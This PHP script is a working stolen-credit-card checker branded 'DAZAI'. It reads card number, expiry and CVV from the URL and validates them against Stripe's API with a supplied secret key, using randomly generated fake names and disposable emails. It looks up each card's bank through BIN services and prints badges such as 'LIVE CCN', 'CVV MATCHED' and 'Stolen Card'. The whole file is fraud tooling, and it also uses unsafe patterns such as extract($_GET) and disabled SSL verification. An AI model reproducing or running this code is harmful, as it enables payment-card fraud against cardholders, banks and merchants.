<?php
error_reporting(0);
ini_set('display_errors', 0);
date_default_timezone_set('Asia/Manila');
function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
function RandomString($length = 23)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@olxbg.cf';
}
$sec1 = $_GET['sec'];
extract($_GET);
$lista = str_replace(" ", "", htmlspecialchars($check));
$i     = explode("|", $check);
$cc    = $i[0];
$mm    = $i[1];
$yyyy  = $i[2];
$yy    = substr($yyyy, 2, 4);
$cvv   = $i[3];
$bin   = substr($cc, 0, 8);
$last4 = substr($cc, 12, 16);
$email = urlencode(emailGenerate());
$m     = ltrim($mm, "0");
$name     = RandomString();
$lastname = RandomString();
$amount = 'Charge : $'.rand(3,7).'.'.rand(01,99);
$amount2 = 'Not Charged';

$street = mt_rand() . " " . RandomString();
$city   = RandomString();
$state  = RandomString();
$sec = htmlspecialchars($sec1);


$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=$cc&card[exp_month]=$mm&card[exp_year]=$yyyy&card[cvc]=$cvv");
curl_setopt($ch, CURLOPT_USERPWD, ''.$sec.'' . ':' . '');

$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result1 = curl_exec($ch);
$json1 = json_decode($result1, true);
$id = ''.$json1["id"].'';
$check1 = ''.$json1["cvc_check"].'';
$err1 = ''.$json1["error"]["message"].''.$json1["error"]["decline_code"];


if(isset($json1["id"])){
///////////////////////////////
$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}
function getbnk($bin)
{
 sleep(rand(1,6));
$bin = substr($bin,0,6);
$url = 'http://bins.su';
//  Initiate curl
$ch = curl_init();
// Disable SSL verification
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
// Will return the response, if false it print the response
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
// Set the url
curl_setopt($ch, CURLOPT_URL,$url);
// Execute
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=searchbins&bins='.$bin.'&BIN=&country=');
$result=curl_exec($ch);
// Closing
curl_close($ch);


if (preg_match_all('(<tr><td>'.$bin.'</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td></tr>)siU', $result, $matches1))
{
$r1 = $matches1[1][0];
$r2 = $matches1[2][0];
$r3 = $matches1[3][0];
$r4 = $matches1[4][0];
$r5 = $matches1[5][0];
//if(stristr($result,$ip'<tr><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td></tr>'))

 return "$r5($r1) $r2:$r3:$r4";

}
else
{
 return "$bin|UNKNOWN";
}
}

///////////////////////////////
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "description=Gaguka Auth&source=".$json1["id"]);
curl_setopt($ch, CURLOPT_USERPWD, $sec . ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result2 = curl_exec($ch);
$json2 = json_decode($result2, true);
$check = ''.$json2["cvc_check"].'';

$err2 = ''.$json2["error"]["message"].''.$json2["error"]["decline_code"];




if(strpos($result1, '"cvc_check": "pass"')) {
echo '<span class="badge badge-dark">Approved CVV ★</span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-light"> ★ CVV MATCHED ★ </span> <span class="badge badge-info">「'.getbnk($cc).'」</span> <span><font class="badge badge-primary"> 𝐃 𝐀 𝐙 𝐀 𝐈 </i></font></span> </br>';
}
elseif(strpos($result1, "insufficient_funds")) {
    echo '<span class="badge badge-dark">Approved CVV ★</span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark"> ★ Insufficient Funds ★ </span> <span class="badge badge-info">「'.getbnk($cc).'」</span> <span><font class="badge badge-primary"> 𝐃 𝐀 𝐙 𝐀 𝐈 </i></font></span> </br>';
}
elseif(strpos($result2, "lost_card" )) {
    echo '<span class="badge badge-dark">#Declined ★</span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-danger"> ★ Lost Card ★ </span> <span class="badge badge-info">「'.getbnk($cc).'」</span> <span><font class="badge badge-primary"> 𝐃 𝐀 𝐙 𝐀 𝐈 </i></font></span> </br>';
}
elseif(strpos($result2, "stolen_card" )) {
    echo '<span class="badge badge-dark">#Approved ★</span></span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark"> ★ Stolen Card ★ </span> <span class="badge badge-info">「'.getbnk($cc).'」</span> <span><font class="badge badge-primary"> 𝐃 𝐀 𝐙 𝐀 𝐈 </i></font></span> </br>';
}
elseif(strpos($result2, "stolen_card" )) {
    echo '<span class="badge badge-dark">#Approved ★</span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark"> ★ Stolen Card ★ </span> <span class="badge badge-info">「'.getbnk($cc).'」</span> </span> <span><font class="badge badge-primary"> 𝐃 𝐀 𝐙 𝐀 𝐈 </i></font></span> </br>';
}
elseif(strpos($result2, "Your card's security code is incorrect." )) {
    echo '<span class="badge badge-dark">#Approved ★</span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark"> ★ LIVE CCN ★ </span> <span class="badge badge-info">「'.getbnk($cc).'」</span> <span><font class="badge badge-primary"> 𝐃 𝐀 𝐙 𝐀 𝐈 </i></font></span> </br>';
}
elseif(strpos($result2, 'security code is invalid.' )) {
    echo '<span class="badge badge-dark">#Approved ★</span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark"> ★ LIVE CCN ★ </span> <span class="badge badge-info">「'.getbnk($cc).'」</span> <span><font class="badge badge-primary"> 𝐃 𝐀 𝐙 𝐀 𝐈 </i></font></span> </br>';
}
elseif(strpos($result2, "incorrect_cvc" )) {
    echo '<span class="badge badge-dark">#Approved ★</span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark"> ★ LIVE CCN ★ </span> <span class="badge badge-info">「'.getbnk($cc).'」</span> <span><font class="badge badge-primary"> 𝐃 𝐀 𝐙 𝐀 𝐈 </i></font></span> </br>';
}
elseif(strpos($result2, '"cvc_check": "fail"' )) {
    echo '<span class="badge badge-dark">#Approved ★</span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark"> ★ LIVE CCN ★ </span> <span class="badge badge-info">「'.getbnk($cc).'」</span> <span><font class="badge badge-primary"> 𝐃 𝐀 𝐙 𝐀 𝐈 </i></font></span> </br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo '<span class="badge badge-dark">#Approved ★</span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark"> ★ Pickup Card ★ </span> <span class="badge badge-info">「'.getbnk($cc).'」</span> <span><font class="badge badge-primary"> 𝐃 𝐀 𝐙 𝐀 𝐈 </i></font></span> </br>'; 
}
    elseif (strpos($result2, '"cvc_check": "pass"')) {
echo '<span class="badge badge-dark">Approved CVV ★</span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-dark"> ★ CVV MATCHED ★ </span> <span class="badge badge-info">「'.getbnk($cc).'」</span> <span><font class="badge badge-primary"> 𝐃 𝐀 𝐙 𝐀 𝐈 </i></font></span> </br>';
}   
elseif (strpos($result2, '"cvc_check": "unavailable"')) {
echo '<span class="badge badge-danger">#Declined ★</span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-danger"> ★ CVC_Check Unavailable ★ </span> <span class="badge badge-info">「'.getbnk($cc).'」</span> <span><font class="badge badge-primary"> 𝐃 𝐀 𝐙 𝐀 𝐈 </i></font></span> </br>';
}
elseif (strpos($result2, '"cvc_check": "unchecked"')) {
echo '<span class="badge badge-danger">#Declined ★</span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-danger"> ★ CVC_Unchecked ★ </span> <span class="badge badge-info">「'.getbnk($cc).'」</span> <span><font class="badge badge-primary"> 𝐃 𝐀 𝐙 𝐀 𝐈 </i></font></span> </br>';
}
else{
  echo '<span class="badge badge-danger">#Declined ★</span> <span class="badge badge-danger"> '.$lista.' </span> <span class="badge badge-danger"> ★ Card Declined ★ </span> <span class="badge badge-info">「'.getbnk($cc).'」</span> <span><font class="badge badge-primary"> 𝐃 𝐀 𝐙 𝐀 𝐈 </i></font></span> <br>';
  //echo $d;
}
}else{
  echo '<span class="badge badge-danger">#Declined ★</span> <span class="badge badge-danger"> '.$lista.' </span> <span class="badge badge-danger">'.$err1.'</span> <span class="badge badge-info">「'.getbnk($cc).'」</span> <span><font class="badge badge-primary"> 𝐃 𝐀 𝐙 𝐀 𝐈 </i></font></span> <br>';
  //echo $d;
}
//echo $result1;
//echo $result2;
//echo $check2;
?>